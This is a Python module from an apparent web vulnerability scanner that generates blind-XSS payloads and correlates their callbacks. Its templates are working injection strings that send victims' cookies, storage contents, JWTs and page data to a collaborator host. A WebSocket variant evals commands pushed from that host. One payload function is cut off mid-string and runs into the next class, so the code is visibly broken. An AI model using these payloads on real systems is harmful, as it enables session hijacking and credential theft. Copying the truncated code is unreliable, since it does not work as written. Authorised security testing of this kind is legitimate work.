"""
Blind XSS.

Blind XSS fires inside an internal tool (admin panel, log viewer, CRM
dashboard, BI tool) — somewhere the tester cannot see the rendered DOM.
We confirm execution by getting the *victim* browser to call home.

ArachneX runs an embedded FastAPI collaborator listening on the
configured domain. It accepts:

  • HTTP GET/POST  on /b/<scan_id>/<probe_id>
  • WebSocket      on /ws/<scan_id>/<probe_id>
  • DNS exfil      via subdomain probes  <probe_id>.<scan_id>.<collab>

Each callback captures: requesting IP, User-Agent, Referer, fetched JS
data (cookies, localStorage, page URL), and timestamps. The engine
correlates callbacks with the injection points that fired them.

This module produces *payloads* (small JS loaders that beacon back) and
parses incoming callbacks. The HTTP server itself is in
arachnex.server.blind_collab.
"""

from __future__ import annotations

import asyncio
import logging
import secrets
import sqlite3
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from arachnex.core.target import Finding, HttpMethod, InjectionPoint, Severity, Target, XSSClass

log = logging.getLogger("arachnex.detect.blind")


# --------------------------------------------------------------------------- #
# Payload templates
# --------------------------------------------------------------------------- #


def _basic_loader(collab_url: str, probe_id: str) -> str:
    """
    Standard image-pixel loader. Works in most contexts.

    Beacon includes: URL, cookies (non-HttpOnly), userAgent, referrer,
    localStorage keys (not values; PII-conservative by default), title.
    """
    return (
        f'<img src=x onerror="fetch(\'{collab_url}/b/{probe_id}\',{{method:\'POST\','
        f'body:JSON.stringify({{u:location.href,t:document.title,'
        f'c:document.cookie,r:document.referrer,'
        f'ua:navigator.userAgent,ls:Object.keys(localStorage||{{}}),'
        f'p:Object.keys(sessionStorage||{{}})}})}}).catch(()=>'
        f'new Image().src=\'{collab_url}/b/{probe_id}/pix?u=\'+'
        f'encodeURIComponent(location.href))">'
    )


def _svg_loader(collab_url: str, probe_id: str) -> str:
    """SVG-namespace variant; sometimes survives sanitizers that strip <img>."""
    return (
        f'<svg/onload="fetch(\'{collab_url}/b/{probe_id}\',{{method:\'POST\','
        f'body:JSON.stringify({{u:location.href,t:document.title,'
        f'c:document.cookie,r:document.referrer,ua:navigator.userAgent}})}})">'
    )


def _websocket_loader(collab_ws: str, probe_id: str) -> str:
    """
    WebSocket loader: maintains a longer-lived channel to capture
    progressive DOM exfil (useful when the tester wants to interact).
    """
    return (
        f'<img src=x onerror="(()=>{{let s=new WebSocket(\'{collab_ws}/ws/{probe_id}\');'
        f's.onopen=()=>s.send(JSON.stringify({{u:location.href,t:document.title,'
        f'c:document.cookie,ua:navigator.userAgent}}));'
        f's.onmessage=(e)=>{{try{{eval(e.data)}}catch{{}}}}}})()">'
    )


def _event_handler_only(collab_url: str, probe_id: str) -> str:
    """Bare event-handler payload — for use inside an existing <input> tag."""
    return (
        f' autofocus onfocus="fetch(\'{collab_url}/b/{probe_id}\',{{method:\'POST\','
        f'body:document.cookie}})" '
    )


def _href_javascript(collab_url: str, probe_id: str) -> str:
    """For href/src reflection contexts."""
    return (
        f"javascript:fetch('{collab_url}/b/{probe_id}',{{method:'POST',"
        f"body:JSON.stringify({{c:document.cookie,u:location.href}})}})"
    )


def _dns_only(collab_dns: str, probe_id: str) -> str:
    """
    Pure DNS exfil — works behind firewalls that allow DNS but block
    outbound HTTP. Encodes a short token in a subdomain.
    """
    return (
        f'<img src=x onerror="new Image().src=\'//{probe_id}.{collab_dns}/x\'">'
    )


# --------------------------------------------------------------------------- #
# Advanced blind loader — full impact capture on execution
# --------------------------------------------------------------------------- #


# The exec-time JS that fires *inside* the victim's browser. Runs every
# time the payload lands in a page. Captures a rich impact snapshot and
# beacons it back to the collab in one POST (with a fallback path).
#
# Kept as ONE string so the outer <img>/<svg>/<script> loader can inline
# it. All data is base64-encoded before send so quotes/newlines don't
# break the wrapping context.
def _exec_time_impact_js(collab_url: str, probe_id: str) -> str:
    return (
        "(async()=>{"
        "const p={"
        "u:location.href,t:document.title,r:document.referrer,"
        "ua:navigator.userAgent,c:document.cookie,"
        "ls:{},ss:{},"
        "jwt:[],forms:[],csrf:[],endpoints:[],"
        "origin:location.origin,dom_size:0,"
        "storage_secrets:[]"
        "};"
        # localStorage + sessionStorage full dump (capped to keep POST small)
        "try{for(let i=0;i<localStorage.length;i++){"
        "const k=localStorage.key(i);"
        "p.ls[k]=String(localStorage.getItem(k)||'').slice(0,2048);}}catch(e){}"
        "try{for(let i=0;i<sessionStorage.length;i++){"
        "const k=sessionStorage.key(i);"
        "p.ss[k]=String(sessionStorage.getItem(k)||'').slice(0,2048);}}catch(e){}"
        # JWT scan anywhere
        "const jre=/\\bey[A-Za-z0-9_-]{5,}\\.ey[A-Za-z0-9_-]{5,}\\.[A-Za-z0-9_-]{5,}\\b/g;"
        "const scan=(s)=>{let m;while((m=jre.exec(s||''))&&p.jwt.length<8){"
        "p.jwt.push(m[0].slice(0,120));}};"
        "scan(document.cookie);"
        "Object.values(p.ls).forEach(scan);Object.values(p.ss).forEach(scan);"
        # CSRF tokens on the page
        "document.queryS


@dataclass
class BlindPayloadVariant:
    label: str
    value: str
    marker_probe_id: str
    contexts: tuple[str, ...]    # which contexts this variant fits


def build_blind_payloads(
    collab_http: str,
    collab_ws: Optional[str],
    collab_dns: Optional[str],
    scan_id: str,
) -> list[BlindPayloadVariant]:
    """
    Build one BlindPayloadVariant per probe. Each variant uses its OWN
    probe_id so the collaborator can attribute callbacks back to the
    specific (target, injection_point, variant) tuple.

    The engine should call this per injection point — not globally — so
    we can correlate.
    """
    pid_prefix = secrets.token_hex(4)
    out: list[BlindPayloadVariant] = []

    def _pid(suffix: str) -> str:
        return f"{scan_id[:8]}-{pid_prefix}-{suffix}"

    out.append(BlindPayloadVariant(
        label="img_onerror_fetch",
        value=_basic_loader(collab_http, _pid("img")),
        marker_probe_id=_pid("img"),
        contexts=("html_body", "attr_dq", "attr_sq", "attr_uq", "svg_foreign"),
    ))
    out.append(BlindPayloadVariant(
        label="svg_onload_fetch",
        value=_svg_loader(collab_http, _pid("svg")),
        marker_probe_id=_pid("svg"),
        contexts=("html_body", "svg_foreign", "mathml_foreign"),
    ))
    out.append(BlindPayloadVariant(
        label="event_handler_only",
        value=_event_handler_only(collab_http, _pid("evh")),
        marker_probe_id=_pid("evh"),
        contexts=("attr_dq", "attr_sq", "attr_uq"),
    ))
    out.append(BlindPayloadVariant(
        label="javascript_scheme",
        value=_href_javascript(collab_http, _pid("href")),
        marker_probe_id=_pid("href"),
        contexts=("url",),
    ))
    if collab_ws:
        out.append(BlindPayloadVariant(
            label="websocket_loader",
            value=_websocket_loader(collab_ws, _pid("ws")),
            marker_probe_id=_pid("ws"),
            contexts=("html_body",),
        ))
    if collab_dns:
        out.append(BlindPayloadVariant(
            label="dns_exfil",
            value=_dns_only(collab_dns, _pid("dns")),
            marker_probe_id=_pid("dns"),
            contexts=("html_body", "attr_dq"),
        ))
    return out


# --------------------------------------------------------------------------- #
# Callback record (populated by the server, consumed here)
# --------------------------------------------------------------------------- #


@dataclass
class BlindCallback:
    probe_id: str
    timestamp_ms: int
    remote_ip: str
    user_agent: str
    referer: Optional[str]
    page_url: Optional[str]
    page_title: Optional[str]
    cookies: Optional[str]
    raw_body: Optional[str]


def callback_to_finding(
    target: Target,
    ip: InjectionPoint,
    payload_value: str,
    callback: BlindCallback,
) -> Finding:
    """Promote a confirmed blind callback to a Finding."""
    extra = {
        "callback_ip": callback.remote_ip,
        "callback_ua": callback.user_agent,
        "callback_referer": callback.referer or "",
        "callback_page_url": callback.page_url or "",
        "callback_page_title": callback.page_title or "",
    }
    title = f"Blind XSS via `{ip.name}` — triggered from {callback.remote_ip}"
    return Finding(
        xss_class=XSSClass.BLIND,
        severity=Severity.HIGH,        # default; triage may bump to CRITICAL
        confidence=0.95,               # actual execution observed
        target_url=target.url,
        method=target.method,
        injection_point=ip,
        payload=payload_value,
        title=title,
        extra=extra,
        cwe=["CWE-79"],
    )


# --------------------------------------------------------------------------- #
# Scanner — delivery + callback correlation
# --------------------------------------------------------------------------- #


@dataclass
class _ProbeRecord:
    """What we remember about each blind payload we shipped."""
    probe_id: str
    target: Target
    ip: InjectionPoint
    payload_value: str
    label: str
    delivered_at_ms: int = field(default_factory=lambda: int(time.time() * 1000))


class BlindScanner:
    """
    Delivers blind payloads during the scan and correlates callbacks that
    land in the collaborator SQLite DB back to (target, ip, payload).

    Lifecycle:
      1. Engine constructs one BlindScanner per scan.
      2. deliver(target) is called per target — one probe_id per variant per
         injection point, so callbacks are fully attributable.
      3. collect_findings() is called after the fuzz pass. It reads the
         collab DB and promotes matching callbacks to Findings.

    The scanner does not run the collab server — the operator runs that
    separately via `arachnex blind`. The scanner just points at the DB the
    server writes to.
    """

    def __init__(self, cfg, http, scan_id: str) -> None:
        self.cfg = cfg
        self.http = http
        self.scan_id = scan_id
        self.probes: dict[str, _ProbeRecord] = {}

    @property
    def enabled(self) -> bool:
        return bool(self.cfg.blind_collab_url)

    async def deliver(self, target: Target) -> None:
        if not self.enabled or not target.injection_points:
            return
        variants = build_blind_payloads(
            collab_http=self.cfg.blind_collab_url,
            collab_ws=self.cfg.blind_collab_ws,
            collab_dns=self.cfg.blind_collab_dns,
            scan_id=self.scan_id,
        )
        for ip in target.injection_points:
            for variant in variants:
                # Each (target, ip, variant) needs its own probe_id so
                # attribution survives async delivery ordering. Re-derive
                # a fresh id here rather than reusing variant.marker_probe_id
                # which is shared across ips. 128-bit entropy so an attacker
                # who reaches the collab DB can't guess a valid probe id
                # and forge a callback attributable to a real target.
                probe_id = f"{self.scan_id[:8]}-{secrets.token_hex(16)}"
                payload = variant.value.replace(variant.marker_probe_id, probe_id)
                self.probes[probe_id] = _ProbeRecord(
                    probe_id=probe_id, target=target, ip=ip,
                    payload_value=payload, label=variant.label,
                )
                try:
                    await self._send(target, ip, payload)
                except Exception:
                    log.debug("blind delivery failed for %s [%s / %s]",
                              target.url, ip.name, variant.label, exc_info=True)

    async def collect_findings(self) -> list[Finding]:
        if not self.enabled or not self.probes:
            return []

        db_path = Path(self.cfg.blind_collab_db)
        wait = max(0.0, float(self.cfg.blind_collect_wait_seconds))
        end_at = time.monotonic() + wait
        emitted: set[str] = set()
        findings: list[Finding] = []

        while True:
            for probe_id, cb in self._read_callbacks(db_path).items():
                if probe_id in emitted:
                    continue
                rec = self.probes.get(probe_id)
                if not rec:
                    continue
                findings.append(callback_to_finding(
                    target=rec.target, ip=rec.ip,
                    payload_value=rec.payload_value, callback=cb,
                ))
                emitted.add(probe_id)

            if time.monotonic() >= end_at or wait == 0.0:
                break
            await asyncio.sleep(min(2.0, max(0.5, wait / 6)))

        if findings:
            log.info("blind XSS: %d callback(s) correlated to probes", len(findings))
        elif self.probes:
            log.info("blind XSS: %d probe(s) delivered, no callbacks yet (check "
                     "%s later)", len(self.probes), db_path)
        return findings

    # ------------------------------------------------------------------ #
    # Internals
    # ------------------------------------------------------------------ #

    async def _send(self, target: Target, ip: InjectionPoint, value: str) -> None:
        method = target.method.value
        url = target.url
        data = target.body
        headers = dict(target.headers)
        cookies = dict(target.cookies)

        if ip.location == "query":
            u = urlsplit(url)
            qs = parse_qsl(u.query, keep_blank_values=True)
            qs = [(k, value if k == ip.name else v) for k, v in qs]
            if ip.name not in dict(qs):
                qs.append((ip.name, value))
            url = urlunsplit(u._replace(query=urlencode(qs, doseq=True)))
        elif ip.location == "body":
            if target.body_kind == "json":
                import json as _json
                try:
                    b = _json.loads(target.body or "{}")
                    b[ip.name] = value
                    data = _json.dumps(b)
                except Exception:
                    return
            else:
                items = parse_qsl(target.body or "", keep_blank_values=True)
                items = [(k, value if k == ip.name else v) for k, v in items]
                if ip.name not in dict(items):
                    items.append((ip.name, value))
                data = urlencode(items, doseq=True)
        elif ip.location == "header":
            headers[ip.name] = _strip_ctl(value)
        elif ip.location == "cookie":
            cookies[ip.name] = _strip_ctl(value)
        else:
            return

        await self.http.request(
            method, url,
            data=data if method in {"POST", "PUT", "PATCH"} else None,
            headers=headers, cookies=cookies,
        )

    @staticmethod
    def _read_callbacks(db_path: Path) -> dict[str, BlindCallback]:
        """
        Read all callbacks the collab server has recorded so far. Keyed by
        probe_id — if a probe fired multiple times we keep the earliest.

        We open the connection with a short timeout so we wait through any
        transient lock the collab server holds while writing, rather than
        erroring out and losing callbacks. Operational errors (lock,
        schema mismatch) are surfaced at WARNING because they indicate a
        real configuration problem the operator should see.
        """
        if not db_path.exists():
            return {}
        out: dict[str, BlindCallback] = {}
        conn: Optional[sqlite3.Connection] = None
        try:
            conn = sqlite3.connect(str(db_path), timeout=5.0)
            cur = conn.execute(
                "SELECT probe_id, ts_ms, remote_ip, user_agent, referer, "
                "page_url, page_title, cookies, body FROM callbacks "
                "ORDER BY ts_ms ASC"
            )
            for row in cur.fetchall():
                (pid, ts, ip, ua, ref, page_url, page_title, cookies, body) = row
                if pid in out:
                    continue
                out[pid] = BlindCallback(
                    probe_id=pid, timestamp_ms=int(ts or 0),
                    remote_ip=ip or "", user_agent=ua or "",
                    referer=ref or None, page_url=page_url or None,
                    page_title=page_title or None, cookies=cookies or None,
                    raw_body=body or None,
                )
        except sqlite3.OperationalError as e:
            log.warning("blind DB operational error at %s: %s", db_path, e)
        except sqlite3.DatabaseError as e:
            log.warning("blind DB read failed at %s: %s", db_path, e)
        except Exception:
            log.debug("unexpected blind DB error at %s", db_path, exc_info=True)
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:
                    pass
        return out


def _strip_ctl(value: str) -> str:
    """
    Remove CR / LF / NUL from values that flow into HTTP headers or
    cookies to prevent CRLF injection on the scanner-side request. Real
    XSS payloads in header/cookie contexts never require these bytes.
    """
    return value.replace("\r", "").replace("\n", "").replace("\x00", "")
